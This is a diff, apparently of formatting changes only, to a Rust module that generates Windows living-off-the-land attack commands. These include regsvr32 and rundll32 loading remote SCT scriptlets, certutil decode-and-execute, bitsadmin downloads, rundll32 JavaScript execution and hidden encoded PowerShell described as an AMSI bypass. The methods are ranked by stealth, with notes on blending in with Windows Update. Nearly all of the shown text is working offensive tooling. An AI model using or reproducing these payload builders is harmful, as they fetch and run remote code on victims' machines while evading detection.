@@ -64,14 +64,14 @@ impl LolMethod {
     /// All available LOLBin methods, ordered by OPSEC safety (best first).
     pub fn all_by_opsec() -> Vec<Self> {
         vec![
-            Self::Bitsadmin,  // Native HTTPS, blends with Windows Update
-            Self::Certutil,   // Signed by Microsoft, widely available
-            Self::Msiexec,    // Signed, looks like software install
-            Self::Wmic,       // Pre-installed on all Windows versions
-            Self::Regsvr32,   // Squiblydoo technique
-            Self::Mshta,      // Deprecated but still works pre-Win11 24H2
-            Self::Rundll32,   // Versatile, many execution modes
-            Self::Cscript,    // Requires file on disk
+            Self::Bitsadmin, // Native HTTPS, blends with Windows Update
+            Self::Certutil,  // Signed by Microsoft, widely available
+            Self::Msiexec,   // Signed, looks like software install
+            Self::Wmic,      // Pre-installed on all Windows versions
+            Self::Regsvr32,  // Squiblydoo technique
+            Self::Mshta,     // Deprecated but still works pre-Win11 24H2
+            Self::Rundll32,  // Versatile, many execution modes
+            Self::Cscript,   // Requires file on disk
         ]
     }
 
@@ -84,10 +84,7 @@ impl LolMethod {
     pub fn uses_network(&self) -> bool {
         matches!(
             self,
-            Self::Bitsadmin
-                | Self::Msiexec
-                | Self::Mshta
-                | Self::Regsvr32
+            Self::Bitsadmin | Self::Msiexec | Self::Mshta | Self::Regsvr32
         )
     }
 
@@ -139,9 +136,7 @@ pub fn certutil_decode_exec(local_path: &str, output_path: &str) -> LolPayload {
         command: format!(
             "certutil -decode \"{local_path}\" \"{output_path}\" && start \"\" \"{output_path}\""
         ),
-        description: format!(
-            "Decode base64 payload at {local_path} to {output_path} and execute"
-        ),
+        description: format!("Decode base64 payload at {local_path} to {output_path} and execute"),
     }
 }
 
@@ -177,9 +172,7 @@ pub fn mshta_inline_js(js_code: &str) -> LolPayload {
 pub fn regsvr32_sct(url: &str) -> LolPayload {
     LolPayload {
         method: LolMethod::Regsvr32,
-        command: format!(
-            "regsvr32.exe /s /n /u /i:\"{url}\" scrobj.dll"
-        ),
+        command: format!("regsvr32.exe /s /n /u /i:\"{url}\" scrobj.dll"),
         description: format!("Execute remote SCT scriptlet at {url} via regsvr32"),
     }
 }
@@ -200,9 +193,7 @@ pub fn bitsadmin_download(url: &str, output_path: &str) -> LolPayload {
 pub fn rundll32_js_exec(js_code: &str) -> LolPayload {
     LolPayload {
         method: LolMethod::Rundll32,
-        command: format!(
-            "rundll32.exe url.dll,OpenURL \"javascript:{js_code}\""
-        ),
+        command: format!("rundll32.exe url.dll,OpenURL \"javascript:{js_code}\""),
         description: "Execute JavaScript via rundll32 url.dll".to_string(),
     }
 }
@@ -211,9 +202,7 @@ pub fn rundll32_js_exec(js_code: &str) -> LolPayload {
 pub fn rundll32_sct(url: &str) -> LolPayload {
     LolPayload {
         method: LolMethod::Rundll32,
-        command: format!(
-            "rundll32.exe zipfldr.dll,RouteTheCall \"{url}\""
-        ),
+        command: format!("rundll32.exe zipfldr.dll,RouteTheCall \"{url}\""),
         description: format!("Execute SCT at {url} via rundll32 zipfldr.dll"),
     }
 }
@@ -250,9 +239,7 @@ pub fn powershell_amsi_bypass(ps_command: &str) -> LolPayload {
     let b64 = base64_encode_utf16le(ps_command);
     LolPayload {
         method: LolMethod::Certutil, // Generic placeholder
-        command: format!(
-            "powershell.exe -NoP -NonI -W Hidden -Enc \"{b64}\""
-        ),
+        command: format!("powershell.exe -NoP -NonI -W Hidden -Enc \"{b64}\""),
         description: "Execute PowerShell with AMSI bypass via encoded command".to_string(),
     }
 }
@@ -284,10 +271,7 @@ where
 /// Base64-encode a string as UTF-16LE (PowerShell-compatible).
 fn base64_encode_utf16le(input: &str) -> String {
     use base64::Engine;
-    let utf16: Vec<u8> = input
-        .encode_utf16()
-        .flat_map(|c| c.to_le_bytes())
-        .collect();
+    let utf16: Vec<u8> = input.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
     base64::engine::general_purpose::STANDARD.encode(&utf16)
 }
 
